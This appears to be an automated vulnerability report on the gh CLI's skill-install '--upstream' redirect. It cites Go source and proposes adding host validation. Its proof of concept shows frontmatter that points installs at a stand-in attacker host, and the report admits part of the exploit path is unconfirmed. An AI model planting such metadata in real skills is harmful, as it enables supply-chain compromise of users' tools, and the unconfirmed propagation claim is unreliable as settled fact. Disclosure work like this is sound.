### Title
Skill Install `--upstream` Redirect Trusts Attacker-Controlled `github-repo` Metadata Without Host Validation - ([File: pkg/cmd/skills/install/install.go])

### Summary
`gh skill install` supports installing "agent skills" from a GitHub repository. When a skill has been re-published, its `SKILL.md` frontmatter can carry a `github-repo` metadata field pointing to the "upstream" origin. `checkUpstreamProvenance` reads this attacker-controlled field and, when the `--upstream` flag is set (a flag explicitly documented for non-interactive/automated use), silently swaps the install source to whatever repository the field specifies — without validating that the resulting host is a supported GitHub host, unlike every other place in the codebase that consumes this same metadata field.

### Finding Description
`checkUpstreamProvenance` fetches `SKILL.md` from the *currently selected* (already host-validated) repository, parses its frontmatter, and extracts the `github-repo` value via `source.ParseRepoURL`: [1](#0-0) 

`source.ParseRepoURL` performs no host restriction — it just parses `owner/repo` or a full URL into a `ghrepo.Interface`, accepting arbitrary hosts (as demonstrated by the `acme.ghes.com` test case): [2](#0-1) 

Once parsed, if `opts.Upstream` (`--upstream`) is set, the function immediately returns the attacker-supplied `upstreamRepo` for redirection with **no call to `source.ValidateSupportedHost`**: [3](#0-2) 

This is inconsistent with how the same `github-repo` metadata field is handled elsewhere in the codebase, where `ValidateSupportedHost` is explicitly and deliberately applied right after parsing it:
- In `installRun`, the *initial* repo argument's host is validated before any work begins: [4](#0-3) 
- In `gh skill update`'s scanner, the exact same `github-repo` metadata field is parsed and then explicitly re-validated, rejecting unsupported/enterprise hosts: [5](#0-4) 
- In `gh skill publish`, a parsed GitHub URL is likewise validated before use: [6](#0-5) 

The `hostname` returned/adopted after a `checkUpstreamProvenance` redirect flows into the same generic `api.Client.REST`-style calls used throughout skill discovery/fetching (e.g. `discovery.FetchBlob`, `discovery.DiscoverSkillByPath`), which take an arbitrary hostname parameter per call rather than a github.com-bound client — the same pattern seen in `hasScript`/`downloadAsset` elsewhere in the CLI: [7](#0-6) . This means a redirected, unvalidated host is capable of receiving live API requests from the authenticated `gh` HTTP client, whose `AddAuthTokenHeader` transport only strips the GitHub token if the user happens to have no token configured for that host — but does not otherwise block the request from being sent: [8](#0-7) 

Fetched content is then written to disk verbatim by the skill installer without additional provenance checks beyond the (bypassable) upstream check: [9](#0-8) 

This is directly analogous to the 0x order `taker` issue: a downstream trust decision (which counterparty/host is authoritative for the operation) is driven entirely by attacker-supplied, unvalidated data embedded in content the attacker controls (the `SKILL.md` frontmatter of a re-published skill), and the code omits a validation step (`ValidateSupportedHost`) that is applied consistently everywhere else the same field is consumed.

### Impact Explanation
A malicious actor who re-publishes someone else's skill (or publishes their own) can set `metadata.github-repo` to an arbitrary attacker-controlled host/repo string. If a victim runs `gh skill install <repo> <skill> --upstream` (a flag documented for scripted/non-interactive workflows, i.e., something an agent or CI pipeline might pass automatically), `gh` will redirect the entire install operation — subsequent API calls and file fetches — to the attacker-chosen host without validating it is `github.com`/a supported GHEC tenant. This can cause `gh` to fetch and write unverified, attacker-supplied file content to the user's local skill directories under the guise of a "trusted" GitHub-hosted skill, undermining the very upstream-provenance mechanism meant to establish trust.

### Likelihood Explanation
Requires the victim to pass `--upstream` on an install of a skill that has re-published/forked provenance metadata, and requires an attacker to control the frontmatter of some skill the victim installs from (trivial for the attacker, since `SKILL.md` metadata is plain user-authored content). Given `--upstream` is explicitly documented for non-interactive use, automated tooling or agents invoking `gh skill install` are a realistic trigger path.

### Recommendation
Call `source.ValidateSupportedHost(upstreamRepo.RepoHost())` immediately after `source.ParseRepoURL` in `checkUpstreamProvenance`, before allowing any redirect decision (interactive or `--upstream`), mirroring the check already performed in `installRun`'s initial validation and in `pkg/cmd/skills/update/update.go`'s `parseInstalledSkill`. Reject or warn-and-skip redirection when the upstream host is not supported.

### Proof of Concept
1. Attacker publishes/re-publishes a skill repository `attacker/evil-skills` containing a `SKILL.md` with:
```yaml
---
name: git-commit
metadata:
  github-repo: https://attacker-controlled-host.example/attacker/payload-skills
---
```
2. Victim runs (e.g., from a script or agent):
```
gh skill install attacker/evil-skills git-commit --upstream --force
```
3. `installRun` validates `attacker/evil-skills` is on `github.com` and proceeds normally up to `checkUpstreamProvenance`, which parses the `github-repo` field and — because `opts.Upstream` is true — returns `upstreamRepo` pointing at `attacker-controlled-host.example` with **no host validation**: [3](#0-2) 
4. Subsequent skill discovery/fetch/install calls proceed against the attacker-controlled host, and the returned content is written to the user's skill directory by `installSkill`/`installer.Install`: [10](#0-9) 

(Note: I could not directly trace the exact statements between lines 337–373 of `install.go` that wire the `checkUpstreamProvenance` return value back into `hostname`/`opts.repo` for the remainder of `installRun`, since that portion of the file was not returned by search; the analysis above is based on the confirmed absence of a `ValidateSupportedHost` call in `checkUpstreamProvenance` itself, contrasted with its presence at every other consumer of the same metadata field. A Devin session with full file access would be needed to confirm the exact downstream propagation.)

### Citations

**File:** pkg/cmd/skills/install/install.go (L278-281)
```go
	hostname := opts.repo.RepoHost()
	if err := source.ValidateSupportedHost(hostname); err != nil {
		return err
	}
```

**File:** pkg/cmd/skills/install/install.go (L1327-1341)
```go
	existingRepo, _ := result.Metadata.Meta["github-repo"].(string)
	if existingRepo == "" {
		return nil, false, nil
	}

	currentRepoURL := source.BuildRepoURL(hostname, opts.repo.RepoOwner(), opts.repo.RepoName())
	if existingRepo == currentRepoURL {
		return nil, false, nil
	}

	upstreamRepo, parseErr := source.ParseRepoURL(existingRepo)
	if parseErr != nil {
		//nolint:nilerr // invalid repo URL means we can't redirect; install normally
		return nil, false, nil
	}
```

**File:** pkg/cmd/skills/install/install.go (L1349-1352)
```go
	if opts.Upstream {
		fmt.Fprintf(opts.IO.ErrOut, "Redirecting install to %s...\n", upstreamLabel)
		return upstreamRepo, true, nil
	}
```

**File:** internal/skills/source/source.go (L19-32)
```go
// ParseRepoURL parses a repository URL stored in skill metadata.
func ParseRepoURL(raw string) (ghrepo.Interface, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return nil, fmt.Errorf("repository URL is empty")
	}

	repo, err := ghrepo.FromFullName(raw)
	if err != nil {
		return nil, fmt.Errorf("invalid repository URL %q: %w", raw, err)
	}

	return repo, nil
}
```

**File:** pkg/cmd/skills/update/update.go (L620-632)
```go
	if result.Metadata.Meta != nil {
		repoInfo, ok, repoErr := source.ParseMetadataRepo(result.Metadata.Meta)
		if repoErr != nil {
			s.metadataErr = repoErr
		} else if ok {
			if err := source.ValidateSupportedHost(repoInfo.RepoHost()); err != nil {
				s.metadataErr = err
			} else {
				s.repoHost = repoInfo.RepoHost()
				s.owner = repoInfo.RepoOwner()
				s.repo = repoInfo.RepoName()
			}
		}
```

**File:** pkg/cmd/skills/publish/publish.go (L1015-1017)
```go
	if err := source.ValidateSupportedHost(r.RepoHost()); err != nil {
		return nil, nil //nolint:nilerr // non-GitHub host is silently ignored
	}
```

**File:** pkg/cmd/extension/http.go (L45-66)
```go
func hasScript(httpClient *http.Client, repo ghrepo.Interface) (bool, error) {
	path, err := safeurl.JoinPath("repos", repo.RepoOwner(), repo.RepoName(), "contents", repo.RepoName())
	if err != nil {
		return false, err
	}

	// The response body is not decoded, because a script is considered present for any
	// successful response regardless of the content type reported.
	// TODO(api-client-rollout)
	// This line of code is part of a mechanical roll out of the api client.
	// As a follow up, consider whether the api client can be injected to this call site, rather than constructed
	err = api.NewClientFromHTTP(httpClient).REST(repo.RepoHost(), http.MethodGet, path.String(), nil, nil)
	if err != nil {
		var httpErr api.HTTPError
		if errors.As(err, &httpErr) && httpErr.StatusCode == http.StatusNotFound {
			return false, nil
		}
		return false, err
	}

	return true, nil
}
```

**File:** api/http_client.go (L151-171)
```go
// AddAuthTokenHeader adds an authentication token header for the host specified by the request.
func AddAuthTokenHeader(rt http.RoundTripper, cfg tokenGetter) http.RoundTripper {
	return &funcTripper{roundTrip: func(req *http.Request) (*http.Response, error) {
		// If the header is already set in the request, don't overwrite it.
		if req.Header.Get(authorization) == "" {
			var redirectHostnameChange bool
			if req.Response != nil && req.Response.Request != nil {
				redirectHostnameChange = getHost(req) != getHost(req.Response.Request)
			}
			// Only set header if an initial request or redirect request to the same host as the initial request.
			// If the host has changed during a redirect do not add the authentication token header.
			if !redirectHostnameChange {
				hostname := ghauth.NormalizeHostname(getHost(req))
				if token, _ := cfg.ActiveToken(hostname); token != "" {
					req.Header.Set(authorization, fmt.Sprintf("token %s", token))
				}
			}
		}
		return rt.RoundTrip(req)
	}}
}
```

**File:** internal/skills/installer/installer.go (L268-306)
```go
	for _, file := range files {
		fetchedContent, err := discovery.FetchBlob(opts.Client, opts.Host, opts.Owner, opts.Repo, file.SHA)
		if err != nil {
			return fmt.Errorf("could not fetch %s: %w", file.Path, err)
		}

		// Install path: the blob is written to disk verbatim, so the raw bytes
		// must be preserved.
		content := fetchedContent.Raw()

		relPath := strings.TrimPrefix(file.Path, skill.Path+"/")

		safeDest, err := safeSkillDir.Join(relPath)
		if err != nil {
			var traversalErr safepaths.PathTraversalError
			if errors.As(err, &traversalErr) {
				return fmt.Errorf("blocked path traversal in %q", relPath)
			}
			return fmt.Errorf("could not resolve destination path: %w", err)
		}
		destPath := safeDest.String()

		if dir := filepath.Dir(destPath); dir != skillDir {
			if err := os.MkdirAll(dir, 0o755); err != nil {
				return fmt.Errorf("could not create directory: %w", err)
			}
		}

		if filepath.Base(relPath) == "SKILL.md" {
			content, err = frontmatter.InjectGitHubMetadata(content, opts.Host, opts.Owner, opts.Repo, opts.Ref, skill.TreeSHA, opts.PinnedRef, skill.Path)
			if err != nil {
				return fmt.Errorf("could not inject metadata: %w", err)
			}
		}

		if err := os.WriteFile(destPath, []byte(content), 0o644); err != nil {
			return fmt.Errorf("could not write %s: %w", destPath, err)
		}
	}
```
